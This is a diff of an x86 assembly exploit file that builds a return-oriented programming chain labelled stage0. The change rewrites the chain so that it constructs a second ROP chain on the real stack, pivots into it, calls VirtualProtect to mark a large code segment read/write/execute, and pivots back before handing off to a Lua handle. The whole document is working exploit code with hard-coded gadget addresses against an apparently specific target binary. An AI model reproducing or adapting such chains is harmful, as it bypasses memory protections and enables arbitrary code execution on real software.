@@ -20,17 +20,66 @@ stage0:
         dd 40FCB5h          ; add esp, 4 ; ret
         dd 0            ;D eID, do not overwrite!
         dd 58A6CFh          ; push eax ; pop eax ; ret 4
-        dd 6281CEh          ; add esp, 0x100 ; ret                  ; space for VirtualProtect
-        times 104h db 0                                             ; and other calls
         
-        dd 40142Bh          ; pop eax ; ret
-        dd virtualProtect
-        dd 48A71Bh          ; call [eax] ; ret
+        ; yo dawg, i herd u liek stack pivots...
+        ; Set up a ROP chain on the actual stack, pivot to it, run VirtualProtect and pivot back
         
-        dd 401000h      ;D start of segment 
-        dd 64B000h      ;D length
-        dd 40h          ;D new access: R/W/X
-        dd 856A28h      ;D dummy ptr, old permissions
+        dd 5D4014h			; sub eax, 0x30 ; ret
+        dd 1            ;D dummy for ret 4
+        
+        dd 402223h          ; pop ecx ; ret
+        dd 40142Bh  ;D pop eax ; ret
+        dd 42E17Fh			; mov dword ptr [eax + 4], ecx ; ret
+		dd 40235Fh 			; mov dword ptr [eax + 0x20], ecx ; ret
+        
+        dd 402223h          ; pop ecx ; ret
+        dd virtualProtect ;D import ptr to VirtualProtect
+        dd 490654h			; mov dword ptr [eax + 8], ecx ; ret
+        
+        dd 402223h          ; pop ecx ; ret
+        dd 48A71Bh  ;D call [eax] ; ret
+        dd 4848D0h			; mov dword ptr [eax + 0xc], ecx ; ret
+        
+        dd 402223h          ; pop ecx ; ret
+		dd 401000h  ;D start of segment 
+        dd 4961C8h 			; mov dword ptr [eax + 0x10], ecx ; ret
+        
+        dd 402223h          ; pop ecx ; ret
+        dd 64B000h  ;D length
+        dd 484C5Dh 			; mov dword ptr [eax + 0x14], ecx ; ret
+        
+        dd 402223h          ; pop ecx ; ret
+        dd 40h      ;D new access: R/W/X
+        dd 484CD6h 			; mov dword ptr [eax + 0x18], ecx ; ret
+        
+        dd 402223h          ; pop ecx ; ret
+        dd 856A28h  ;D dummy ptr, old permissions
+        dd 40740Dh 			; mov dword ptr [eax + 0x1c], ecx ; ret
+        
+; already written earlier
+;       dd 402223h          ; pop ecx ; ret
+;		dd 40142Bh  ;D pop eax ; ret
+;		dd 40235Fh 			; mov dword ptr [eax + 0x20], ecx ; ret
+            
+        dd 637B4Ch          ; xchg eax, ecx ; ret                       ; ecx = pivot base
+        dd 4035A8h 			; xor eax, eax ; ret						; null & reset SF
+        dd 595842h			; add eax, esp ; pop edi ; js 0x59584c ; ret
+		dd 1			;D dummy, pop'd
+        dd 5B9E9Ah			; add eax, 0x24 ; ret 4
+        dd 637B4Ch          ; xchg eax, ecx ; ret                       ; eax = pivot base, ecx = return_after_pivot
+		dd 1			;D dummy, ret 4
+        dd 4B92C5h 			; mov dword ptr [eax + 0x24], ecx ; ret
+
+        dd 402223h          ; pop ecx ; ret
+        dd 72B479h	;D xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
+        dd 4493D5h 			; mov dword ptr [eax + 0x28], ecx ; ret
+        
+        
+        ; heere we gooo
+        dd 72B479h			; xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
+        
+return_after_pivot:
+        dd 1			;D dummy, gets pop'd into edi
         
         dd 402223h          ; pop ecx ; ret
         dd luaHandle
